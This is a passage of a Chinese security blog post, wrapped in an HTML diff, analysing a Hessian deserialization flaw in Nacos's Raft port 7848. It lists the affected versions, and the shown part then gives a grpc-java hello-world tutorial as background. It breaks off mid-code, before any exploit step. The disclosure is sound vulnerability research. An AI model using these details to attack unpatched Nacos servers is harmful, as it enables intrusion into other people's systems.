@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos Raft Hessian反序列化漏洞分析">
+<meta property="og:url" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607232842205.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607235336573.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230608143518176.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609132153478.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140240776.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140705427.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141722996.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141748714.png">
+<meta property="og:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141822866.png">
+<meta property="article:published_time" content="2023-06-09T07:07:54.000Z">
+<meta property="article:modified_time" content="2023-06-09T07:30:03.522Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Nacos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607232842205.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","path":"2023/06/09/Nacos-Raft-Hessian反序列化漏洞分析/","title":"Nacos Raft Hessian反序列化漏洞分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Nacos Raft Hessian反序列化漏洞分析 | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#grpc-java"><span class="nav-number">2.1.</span> <span class="nav-text">grpc-java</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E4%BE%9D%E8%B5%96"><span class="nav-number">2.1.1.</span> <span class="nav-text">添加依赖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.1.2.</span> <span class="nav-text">定义服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%92%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.3.</span> <span class="nav-text">生成客户端和服务端代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDprotobuf"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">下载protobuf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDprotoc-gen-grpc-java"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">下载protoc-gen-grpc-java</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.3.3.</span> <span class="nav-text">生成代码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-number">2.1.4.</span> <span class="nav-text">创建服务端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-number">2.1.5.</span> <span class="nav-text">创建客户端</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JRaft"><span class="nav-number">2.2.</span> <span class="nav-text">JRaft</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="nav-number">3.</span> <span class="nav-text">漏洞环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82"><span class="nav-number">4.1.</span> <span class="nav-text">构造请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95"><span class="nav-number">4.2.</span> <span class="nav-text">断点调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gadget"><span class="nav-number">4.3.</span> <span class="nav-text">Gadget</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AA%E8%83%BD%E6%89%93%E4%B8%80%E6%AC%A1%EF%BC%9F"><span class="nav-number">5.1.</span> <span class="nav-text">只能打一次？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E6%9D%A1%E8%A7%A6%E5%8F%91%E9%93%BE%E8%B7%AF"><span class="nav-number">5.2.</span> <span class="nav-text">多条触发链路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Nacos Raft Hessian反序列化漏洞分析 | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Nacos Raft Hessian反序列化漏洞分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-09 15:07:54 / 修改时间：15:30:03" itemprop="dateCreated datePublished" datetime="2023-06-09T15:07:54+08:00">2023-06-09</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Nacos默认的7848端口是用于Nacos集群间Raft协议的通信，该端口的服务在处理部分Jraft请求时会使用Hessian进行反序列化</p>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li><p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6</p>
+</li>
+<li><p>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3</p>
+</li>
+</ul>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="grpc-java"><a href="#grpc-java" class="headerlink" title="grpc-java"></a>grpc-java</h3><p>作为分析该漏洞的前置知识，需要对照<a target="_blank" rel="noopener" href="https://grpc.io/docs/languages/java/basics/">官方文档</a>快速学一下（搜了一些教程，但讲的版本比较老了，很多不兼容的地方，Nacos用的是比较新的版本，所以还是以官方教程学习靠谱）</p>
+<h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><p>创建Maven项目 grpc_demo，依赖参考官方<a target="_blank" rel="noopener" href="https://github.com/grpc/grpc-java">README</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-netty-shaded<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-protobuf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-stub<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--运行服务端需要--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="定义服务"><a href="#定义服务" class="headerlink" title="定义服务"></a>定义服务</h4><p>在src&#x2F;main目录下创建proto目录，并创建文件helloworld.proto，内容如下：</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> java_multiple_files = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">option</span> java_package = <span class="string">&quot;com.example.grpc.api&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">Greeter</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> SayHello (HelloRequest) <span class="keyword">returns</span> (HelloReply) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloRequest</span> &#123;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloReply</span> &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="生成客户端和服务端代码"><a href="#生成客户端和服务端代码" class="headerlink" title="生成客户端和服务端代码"></a>生成客户端和服务端代码</h4><p>可以用Maven插件或者命令行工具生成，我觉得用命令行工具更加清晰，用法参考 <a target="_blank" rel="noopener" href="https://grpc.io/docs/languages/java/basics/#generating-client-and-server-code">https://grpc.io/docs/languages/java/basics/#generating-client-and-server-code</a> 和 <a target="_blank" rel="noopener" href="https://grpc.io/docs/languages/java/generated-code/">https://grpc.io/docs/languages/java/generated-code/</a> </p>
+<h5 id="下载protobuf"><a href="#下载protobuf" class="headerlink" title="下载protobuf"></a>下载protobuf</h5><p><a target="_blank" rel="noopener" href="https://github.com/protocolbuffers/protobuf/releases/tag/v23.2">https://github.com/protocolbuffers/protobuf/releases/tag/v23.2</a></p>
+<p>下载自己系统对应的版本并放入proto目录</p>
+<h5 id="下载protoc-gen-grpc-java"><a href="#下载protoc-gen-grpc-java" class="headerlink" title="下载protoc-gen-grpc-java"></a>下载protoc-gen-grpc-java</h5><p><a target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/1.9.1/">https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/1.9.1/</a></p>
+<p>同样下载和系统对应的版本放入proto目录</p>
+<h5 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h5><p>cd到proto目录，将下载的protoc-gen-grpc-java重命名为标准名称，添加可执行权限，并运行protoc生成代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> protoc-gen-grpc-java-1.9.1-osx-x86_64.exe protoc-gen-grpc-java</span><br><span class="line"><span class="built_in">chmod</span> +x protoc-gen-grpc-java</span><br><span class="line">./protoc --plugin=protoc-gen-grpc-java --grpc-java_out=../java --java_out=../java helloworld.proto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607232842205.png" alt="image-20230607232842205"></p>
+<h4 id="创建服务端"><a href="#创建服务端" class="headerlink" title="创建服务端"></a>创建服务端</h4><p>实现具体代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.GreeterGrpc;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloReply;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloRequest;</span><br><span class="line"><span class="keyword">import</span> io.grpc.stub.StreamObserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreeterService</span> <span class="keyword">extends</span> <span class="title class_">GreeterGrpc</span>.GreeterImplBase &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(HelloRequest request, StreamObserver&lt;HelloReply&gt; responseObserver)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getName();</span><br><span class="line">        <span class="type">HelloReply</span> <span class="variable">helloReply</span> <span class="operator">=</span> HelloReply.newBuilder().setMessage(<span class="string">&quot;Hello, &quot;</span>+name).build();</span><br><span class="line">        responseObserver.onNext(helloReply);</span><br><span class="line">        responseObserver.onCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行服务：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.service.GreeterService;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Server;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ServerBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreeterServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8888</span>;</span><br><span class="line">        <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> ServerBuilder.forPort(port).addService(<span class="keyword">new</span> <span class="title class_">GreeterService</span>()).build();</span><br><span class="line">        server.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Running...&quot;</span>);</span><br><span class="line">        server.awaitTermination();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="创建客户端"><a href="#创建客户端" class="headerlink" title="创建客户端"></a>创建客户端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.GreeterGrpc;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloReply;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloRequest;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Channel;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ManagedChannelBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreeterClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();</span><br><span class="line">        GreeterGrpc.<span class="type">GreeterBlockingStub</span> <span class="variable">greeterBlockingStub</span> <span class="operator">=</span> GreeterGrpc.newBlockingStub(channel);</span><br><span class="line">        <span class="type">HelloRequest</span> <span class="variable">helloRequest</span> <span class="operator">=</span> HelloRequest.newBuilder().setName(<span class="string">&quot;leixiao&quot;</span>).build();</span><br><span class="line">        <span class="type">HelloReply</span> <span class="variable">helloReply</span> <span class="operator">=</span> greeterBlockingStub.sayHello(helloRequest);</span><br><span class="line">        System.out.println(helloReply.getMessage());</span><br><span class="line">    